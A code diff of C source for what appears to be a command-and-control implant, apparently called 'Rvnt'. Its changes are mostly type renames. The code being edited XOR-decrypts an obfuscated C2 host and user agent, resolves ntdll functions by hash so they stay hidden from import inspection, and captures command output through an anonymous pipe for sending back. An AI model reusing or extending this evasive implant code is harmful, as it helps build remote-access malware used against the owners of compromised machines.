@@ -18,17 +18,17 @@ VOID RvntInit() {
 
     // Init Connection info
     // UserAgent and Host IP always obfuscated
-    unsigned char s_xk[] = S_XK;
-    char unsigned e_UserAgent[] = CONFIG_USER_AGENT;
-    char unsigned e_Host[] = CONFIG_HOST;
+    UCHAR s_xk[] = S_XK;
+    UCHAR e_UserAgent[] = CONFIG_USER_AGENT;
+    CHAR e_Host[] = CONFIG_HOST;
 
-    xor_dec((char *)e_UserAgent, sizeof(e_UserAgent), (char *)s_xk, sizeof(s_xk));
-    xor_dec((char *)e_Host, sizeof(e_Host), (char *)s_xk, sizeof(s_xk));
+    xor_dec((PCHAR)e_UserAgent, sizeof(e_UserAgent), (PCHAR)s_xk, sizeof(s_xk));
+    xor_dec((PCHAR)e_Host, sizeof(e_Host), (PCHAR)s_xk, sizeof(s_xk));
 
-    wchar_t * w_UserAgent = NULL;
-    wchar_t * w_Host = NULL;
+    PWCHAR w_UserAgent = NULL;
+    PWCHAR w_Host = NULL;
 
-    w_UserAgent = str_to_wide(e_UserAgent);
+    w_UserAgent = str_to_wide( e_UserAgent);
     w_Host = str_to_wide(e_Host);
 
     Instance.Config.Transport.UserAgent = w_UserAgent;
@@ -38,9 +38,9 @@ VOID RvntInit() {
 
     // Init Win32
 #if CONFIG_ARCH == 64
-    void *ntdll_base = get_ntdll_64();
+    PVOID ntdll_base = get_ntdll_64();
 #else
-    void *ntdll_base = get_ntdll_32();
+    PVOID ntdll_base = get_ntdll_32();
 #endif
     // _tprintf("NTDLL_BASE: %x\n", ntdll_base);
     Instance.Win32.RtlRandomEx   = GetProcAddressByHash(ntdll_base, RtlRandomEx_CRC32B);
@@ -53,13 +53,13 @@ VOID RvntInit() {
     // _tprintf( "Magic Value => %x\n", RVNT_MAGIC_VALUE );
 }
 
-void AnonPipeRead( HANDLE hSTD_OUT_Read ) {
+VOID AnonPipeRead( HANDLE hSTD_OUT_Read ) {
     PPACKAGE Package         = NULL;
     LPVOID   pOutputBuffer   = NULL;
     UCHAR    buf[ 1025 ]     = { 0 };
     DWORD    dwBufferSize    = 0;
     DWORD    dwRead          = 0;
-    BOOL     SuccessFul      = FALSE;
+    BOOLEAN  SuccessFul      = FALSE;
 
     pOutputBuffer = LocalAlloc( LPTR, sizeof(LPVOID) );
 
